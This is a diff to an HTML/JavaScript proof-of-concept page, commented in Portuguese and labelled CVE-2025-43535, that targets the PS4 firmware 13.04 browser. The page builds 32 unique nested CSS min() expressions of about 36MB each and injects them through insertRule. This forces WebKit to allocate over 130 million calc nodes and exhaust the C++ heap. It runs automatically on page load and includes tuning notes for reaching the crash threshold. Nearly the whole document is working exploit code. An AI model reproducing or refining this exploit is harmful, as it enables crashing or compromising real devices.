@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 — Chunked Heap Exhaustion</title>
+<title>CVE-2025-43535 — Unique Chunking</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
@@ -11,7 +11,7 @@
 </style>
 </head>
 <body>
-<div>CVE-2025-43535 · Fragmentação de Heap · PS4 FW 13.04</div>
+<div>CVE-2025-43535 · Bypass de Cache · PS4 FW 13.04</div>
 <div id="log"></div>
 <div id="stage" style="visibility:hidden"></div>
 
@@ -24,74 +24,65 @@ const L = (m, c) => {
   d.scrollTop = d.scrollHeight;
 };
 
-// Constrói a árvore de profundidade N (C22 = ~36MB / ~4.19M de nós)
-function buildDepth(depth) {
-  let e = '1px';
+// Respiro para o Garbage Collector limpar as strings do JS
+const yieldGC = () => new Promise(r => setTimeout(r, 150));
+
+// A MÁGICA: O parâmetro 'baseVal' garante que nenhuma árvore seja igual à outra
+function buildUniqueDepth(depth, baseVal) {
+  let e = baseVal + 'px'; // Ex: 1px, 2px, 3px...
   for (let d = 1; d <= depth; d++) {
     e = 'min(' + e + ',' + e + ')';
   }
   return e;
 }
 
-// Respiro para não travar a UI durante o loop
-const yieldGC = () => new Promise(r => setTimeout(r, 100));
-
 async function run() {
-  L('Iniciando Tática de Fragmentação (Style Chunking)...', 'warn');
+  L('Iniciando Ataque por Fragmentação Única...', 'warn');
 
-  // 1. Gera o bloco C22. Como você mapeou, o pico do JS ficará super baixo.
-  L('Construindo o bloco base C22 no JS...', 'info');
-  let c22;
-  try {
-    c22 = buildDepth(22);
-    L(`Bloco C22 gerado. Tamanho no JS: ~36MB.`, 'ok');
-  } catch(e) {
-    L('Erro ao gerar C22: ' + e, 'fail');
-    return;
-  }
+  // Criamos uma única stylesheet no DOM para receber os blocos
+  const styleEl = document.createElement('style');
+  document.head.appendChild(styleEl);
+  const sheet = styleEl.sheet;
 
-  // 30 tags * 4.19M nós = 125.7M de nós (Acima dos 119.5M do seu limite)
-  const totalTags = 30;
+  // 32 blocos * 4.19M nós = ~134 Milhões de nós C++
+  // Este valor garante que ultrapassamos o threshold de 119.5M do PS4
+  const totalChunks = 32;
 
-  L(`Injetando ${totalTags} tags <style> separadas...`, 'warn');
-  L(`Alvo: Acumular ~125 Milhões de objetos CSSCalcValue.`, 'info');
-
-  for (let i = 1; i <= totalTags; i++) {
+  for (let i = 1; i <= totalChunks; i++) {
     try {
-      const style = document.createElement('style');
-      // Cada tag cria uma classe diferente para o C++ não otimizar e agrupar
-      style.textContent = `.t${i} { width: ${c22} }`;
-      document.head.appendChild(style);
-      
-      L(`[${i}/${totalTags}] Tag <style> anexada (+36MB no Heap C++).`, 'ok');
-      
-      // Instancia a classe no DOM para forçar a engine a criar os nós matemáticos
-      const el = document.createElement('div');
-      el.className = `t${i}`;
-      document.getElementById('stage').appendChild(el);
+      L(`[${i}/${totalChunks}] Alocando árvore única com base ${i}px...`);
+      await new Promise(r => requestAnimationFrame(r)); // Atualiza o ecrã
 
-      // Pausa a cada 5 tags para permitir que o WebKit processe os nós
-      if (i % 5 === 0) await yieldGC();
+      // 1. Gera a string exclusiva de ~36MB no JavaScript
+      let uniquePayload = buildUniqueDepth(22, i);
+
+      // 2. Injeta diretamente no motor CSS (Parser C++)
+      // O insertRule devora a regra sem encher o HTML de texto
+      sheet.insertRule(`.t${i} { width: ${uniquePayload} }`, sheet.cssRules.length);
+
+      // 3. Aplica o estilo a um elemento para instanciar a árvore no Heap
+      const div = document.createElement('div');
+      div.className = `t${i}`;
+      document.getElementById('stage').appendChild(div);
       
+      // Força o motor a processar os cálculos C++ instantaneamente
+      void div.offsetWidth; 
+
+      // 4. Limpa a variável agressivamente para manter a RAM do JS vazia
+      uniquePayload = null;
+
+      L(`[${i}/${totalChunks}] +4.19M nós processados com sucesso.`, 'ok');
+
+      // Aguarda que o lixo do JS seja recolhido antes de continuar
+      await yieldGC();
+
     } catch(e) {
-      L(`Erro na injeção ${i}: ${e}`, 'fail');
+      L(`Falha crítica no bloco ${i}: ${e}`, 'fail');
+      break;
     }
   }
 
-  L('Todas as 30 tags foram injetadas!', 'warn');
-  L('Deletando string do JS para garantir máxima RAM livre pro kernel...', 'info');
-  c22 = null; 
-  await yieldGC();
-
-  L('Forçando recálculo global para ativar o gatilho final...', 'crash');
-  setTimeout(() => {
-    try {
-      void document.body.offsetWidth;
-      L('Sobreviveu. Tente aumentar o número totalTags para 32 ou 35.', 'fail');
-    } catch(e) {
-      L('Erro no layout: ' + e, 'fail');
-    }
-  }, 500);
+  L('Todas as injeções foram concluídas. Se o ecrã não apagou, o limite é superior.', 'info');
 }
 
 window.addEventListener('load', () => setTimeout(run, 500));
